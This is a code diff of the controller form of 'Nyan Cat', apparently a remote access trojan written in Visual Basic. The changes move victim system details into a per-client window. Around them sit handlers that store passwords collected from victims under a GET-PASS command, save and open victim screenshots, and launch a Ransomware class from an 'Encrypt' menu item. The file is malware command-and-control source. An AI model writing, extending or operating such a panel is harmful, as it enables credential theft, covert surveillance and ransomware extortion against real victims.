@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit FEB/26/2018         ##
+'##           N Y A N   C A T  ||  Last edit MAR./07/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -63,10 +63,11 @@ Public Class Form1
 #End Region
 
 #Region "receiving"
-    Public Delegate Sub Delg(ByVal C As C, ByVal B() As Byte)
-    Public Shared Sub Dt(ByVal C As C, ByVal B() As Byte)
+    Delegate Sub _DT(ByVal C As C, ByVal B() As Byte)
+    Shared Sub DT(ByVal C As C, ByVal B() As Byte)
+
         Dim A() As String = Strings.Split(FN.GS(B), SPL)
-        'On Error Resume Next
+        On Error Resume Next
         Select Case A(0)
             Case "INFO"
 
@@ -102,26 +103,41 @@ Public Class Form1
                     End If
                 Next
 
+
             Case "Details"
 
-                F.ListView1.Columns.Add("")
-                F.ListView1.Columns.Add("")
-                F.ListView2.Columns.Add("")
-                F.ListView2.Columns.Add("")
+                If F.InvokeRequired Then
+                    F.Invoke(New _DT(AddressOf DT), C, B)
+                    Exit Sub
+                End If
 
-                F.ListView1.Items.Add("ID").SubItems.Add(A(1))
-                F.ListView1.Items.Add("User").SubItems.Add(A(2))
-                F.ListView1.Items.Add("Current Connection").SubItems.Add(A(11))
-                F.ListView1.Items.Add("Stub").SubItems.Add(A(3))
-                F.ListView1.Items.Add("CPU").SubItems.Add(A(4))
-                F.ListView1.Items.Add("GPU").SubItems.Add(A(5))
-                F.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
-                F.ListView2.Items.Add("Privilege").SubItems.Add(A(6))
-                F.ListView2.Items.Add("Machine Type").SubItems.Add(A(7))
-                F.ListView2.Items.Add("Current Time").SubItems.Add(A(8))
-                F.ListView2.Items.Add("Drivers List").SubItems.Add(A(9))
-                F.ListView2.Items.Add("Last reboot").SubItems.Add(A(10))
-                F.ListView2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+
+                Dim D As Details = My.Application.OpenForms("Details" & C.ip)
+                If D Is Nothing Then
+                    D = New Details
+                    D.Name = "Details" + C.ip
+                    D.F = F
+                    D.C = C
+                    D.Show()
+                End If
+
+                D.ListView1.Clear()
+
+                D.ListView1.Columns.Add("")
+                D.ListView1.Columns.Add("")
+
+                D.ListView1.Items.Add("ID").SubItems.Add(A(1))
+                D.ListView1.Items.Add("User").SubItems.Add(A(2))
+                D.ListView1.Items.Add("Current Connection").SubItems.Add(A(11))
+                D.ListView1.Items.Add("Stub").SubItems.Add(A(3))
+                D.ListView1.Items.Add("CPU").SubItems.Add(A(4))
+                D.ListView1.Items.Add("GPU").SubItems.Add(A(5))
+                D.ListView1.Items.Add("Privilege").SubItems.Add(A(6))
+                D.ListView1.Items.Add("Machine Type").SubItems.Add(A(7))
+                D.ListView1.Items.Add("Current Time").SubItems.Add(A(8))
+                D.ListView1.Items.Add("Drivers List").SubItems.Add(A(9))
+                D.ListView1.Items.Add("Last reboot").SubItems.Add(A(10))
+                D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
             Case "GET-PASS"
                 If Not IO.Directory.Exists("Users" & "\" & A(1)) Then
@@ -136,12 +152,9 @@ Public Class Form1
                 C.L.SubItems(3).Text = A(1)
                 Fix()
             Case "SC"
-                Try
-                    IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
-                    Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")
-                Catch ex As Exception
-                    MsgBox(ex.Message)
-                End Try
+                IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
+                Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")
+
 
 
         End Select
@@ -263,6 +276,13 @@ Public Class Form1
         Next
     End Sub
 
+    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
+        For Each l As ListViewItem In Me.L1.SelectedItems
+            Dim C As C = CType(l.Tag, C)
+            C.SendText("Details")
+        Next
+    End Sub
+
     Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
         Try
             Dim R As New Ransomware
@@ -335,19 +355,7 @@ Public Class Form1
     End Sub
 
     Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
-
         Dim x As Integer
-
-        Try
-            Dim C As C = CType(L1.SelectedItems(x).Tag, C)
-            C.SendText("Details")
-
-        Catch ex As Exception
-            F.ListView1.Clear()
-            F.ListView2.Clear()
-        End Try
-
-
         Try
             If L1.SelectedItems.Count > 0 Then
                 For x = 0 To L1.SelectedItems.Count - 1
